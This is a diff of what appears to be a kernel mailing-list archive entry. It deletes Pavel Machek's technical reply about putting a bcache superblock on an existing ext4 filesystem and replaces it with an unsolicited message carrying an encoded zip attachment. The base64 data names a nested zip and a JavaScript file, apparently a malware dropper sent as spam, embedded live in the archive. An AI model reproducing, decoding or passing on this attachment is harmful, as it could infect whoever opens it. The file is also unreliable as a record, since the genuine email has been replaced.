@@ -1,96 +1,119 @@
-From: Pavel Machek <pavel@ucw.cz>
-Subject: Re: bcache with existing ext4 filesystem
-Date: Wed, 26 Jul 2017 00:02:22 +0200
-Message-ID: <20170725220221.GA32240@amd>
-References: <20170724185703.GA31422@amd>
- <64c810cf-a95c-f862-f25a-ebd7419b2632@thelounge.net>
- <20170724191548.GA32425@amd>
- <20170724192718.t7n5zgualz5lillg@thunk.org>
- <20170724200451.GA4318@amd>
- <20170725045156.kbyaxj4mmi75yyt5@thunk.org>
- <20170725064304.GA11723@amd>
- <20170725103248.GA12869@suse.com>
- <20170725111210.GA5667@amd>
- <alpine.LRH.2.11.1707251810091.9683@mail.ewheeler.net>
+From: <chrisbi_anelyst@mail.dk>
+Subject: (unknown)
+Date: Wed, 26 Jul 2017 11:39:28 -0000
+Message-ID: <150106916804.19426.7893008935486568449@hinet.net>
 Mime-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha1;
-        protocol="application/pgp-signature"; boundary="LZvS9be/3tNcYl/X"
-Cc: Vojtech Pavlik <vojtech@ucw.cz>, Theodore Ts'o <tytso@mit.edu>,
-        Reindl Harald <h.reindl@thelounge.net>,
-        linux-ext4@vger.kernel.org,
-        kernel list <linux-kernel@vger.kernel.org>,
-        kent.overstreet@gmail.com, linux-bcache@vger.kernel.org
-To: Eric Wheeler <bcache@lists.ewheeler.net>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <alpine.LRH.2.11.1707251810091.9683@mail.ewheeler.net>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: linux-ext4.vger.kernel.org
+Content-Type: application/zip; name="EMAIL_136876215_linux-ext4.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
+Return-path: <linux-ext4-owner@vger.kernel.org>
+Received: from 111-243-165-157.dynamic-ip.hinet.net ([111.243.165.157]:43069
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751446AbdGZLjc (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>); Wed, 26 Jul 2017 07:39:32 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-ext4-owner@vger.kernel.org
+List-ID: <linux-ext4.vger.kernel.org>
 
-
---LZvS9be/3tNcYl/X
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
-
-Hi!
-
-> > > > Unfortunately, that would mean shifting 400GB data 8KB forward, and
-> > > > compatibility problems. So I'd prefer adding bcache superblock into
-> > > > the reserved space, so I can have caching _and_ compatibility with
-> > > > grub2 etc (and avoid 400GB move):
-> > >=20
-> > > The common way to do that is to move the beginning of the partition,
-> > > assuming your ext4 lives in a partition.
-> >=20
-> > Well... if I move the partition, grub2 (etc) will be unable to access
-> > data on it. (Plus I do not have free space before some of the
-> > partitions I'd like to be cached).
->=20
-> Why not use dm-linear and prepend space for the bcache superblock?  If=20
-> this is your boot device, then you would need to write a custom=20
-> initrd hook too.
-
-Thanks for a pointer. That would actually work, but I'd have to be
-very, very careful using it...
-
-=2E..because if I, or systemd or some kind of automounter sees the
-underlying device (sda4) and writes to it (it is valid ext4 after
-all), I'll have inconsistent base device and cache ... and that will
-be asking for major problems (even in writethrough mode).
-
-Actually, this already would be usable, if we killed content of cache
-device on every mount. Hmmm. I have reasonably long uptimes these days.
-
-If possible, I'd like something more clever: bcache saves mtime of the
-ext4 filesystem on shutdown. If the mtime does not match on the next
-startup, it means someone fsck-ed the filesystem or mounted it
-directly or something, and cache is invalid.
-
-Bonus would be some kind of interlock with "incompatible feature"
-bits. If the bcache has dirty data in write-back cache, it would be
-nice to have "incompatible feature" bit set, so that tools that don't
-have access to the cache refuse to touch it.
-
-Best regards,
-
-									Pavel
-
---=20
-(english) http://www.livejournal.com/~pavelmachek
-(cesky, pictures) http://atrey.karlin.mff.cuni.cz/~pavel/picture/horses/blo=
-g.html
-
---LZvS9be/3tNcYl/X
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: Digital signature
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iEYEARECAAYFAll3v+0ACgkQMOfwapXb+vJPswCgsWqJBHPvQsCQKiDI3IqMtfKk
-uegAoL4n9Oc+FcQuv4TlLno7nDPRfZZ3
-=XJ6/
------END PGP SIGNATURE-----
-
---LZvS9be/3tNcYl/X--
+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
